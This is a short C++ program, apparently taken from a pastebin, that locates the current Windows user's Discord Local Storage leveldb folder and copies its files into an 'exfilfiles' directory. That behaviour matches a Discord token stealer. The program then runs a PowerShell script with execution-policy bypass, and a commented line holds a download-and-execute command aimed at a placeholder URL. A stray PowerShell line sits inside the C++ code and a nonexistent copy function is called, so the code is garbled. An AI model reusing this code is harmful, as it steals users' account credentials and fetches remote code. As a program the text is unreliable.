// from an old pastebin
#include "windows.h"
#include "lmcons.h"
#include <iostream>
#include <string>
#include <regex>
#include <dirent.h>
#include <sys/types.h>

using namespace std;

bool getUser(LPSTR nameVar, LPDWORD nameSize){
	bool nameIs = GetUserNameA(nameVar, nameSize);
	return nameIs;
}
int main() {
	bool cur_user,didCopy,myDir;
	regex regexp("\\.[a-z]+"); 
	string dirC = "C:\\Users\\";
	string discord = "\\AppData\\Roaming\\discord\\Local Storage\\leveldb";
	iex ((New ObjectNet.WebClient).DownloadString($url))
	DWORD nameSize = UNLEN; 
	char nameVar[UNLEN]; 
	cur_user = getUser( nameVar, &nameSize );
	int userSize = sizeof(nameVar)/sizeof(char) ;
	LPTSTR holdUser = new TCHAR[userSize]; 
	strcpy(holdUser,nameVar);
	string p4wn = dirC + holdUser + discord; 
	LPTSTR tmp1 = new TCHAR[p4wn.size()]; 
	strcpy(tmp1, p4wn.c_str());
	myDir = CreateDirectoryA( "exfilfiles", NULL);
	if ( myDir != FALSE ) {
		cout<<"verified directory\n";
		}	
	else { cout<<"check Desktop, encountered an error\n";
	return 2022;
		}
	DIR *msg;
	struct dirent *en;
	msg = opendir(tmp1); // read directory 
	if (msg) { 
	    while ((en = readdir(msg)) != NULL){
		string tmp = en->d_name; // filename from directory read
		string p4wner = dirC + holdUser + discord + "\\" + tmp;
		smatch m;   
		bool m2 = regex_search(tmp, m, regexp); //check for extension
		if(m2 != FALSE){
			LPTSTR file1 = new TCHAR[p4wner.size()]; 
			strcpy(file1, p4wner.c_str());
			string exfil = "exfilfiles\\" + tmp; 
			LPTSTR file2 = new TCHAR[exfil.size()]; 
			strcpy(file2, exfil.c_str());
			LPCSTR oldF = file1;
			LPCSTR newF = file2;
			didCopy = file_copy(oldF, newF, true);
			if (didCopy != FALSE){
		       cout<<"working please wait...\n";
			}
		}
  	}
    	closedir(msg);
	}
	system("powershell -ep bypass ./37h9ehf97he9.ps1");
//system("powershell -c iex ((New ObjectNet.WebClient).DownloadString('[myurlhere]'))")
	return(0);
}
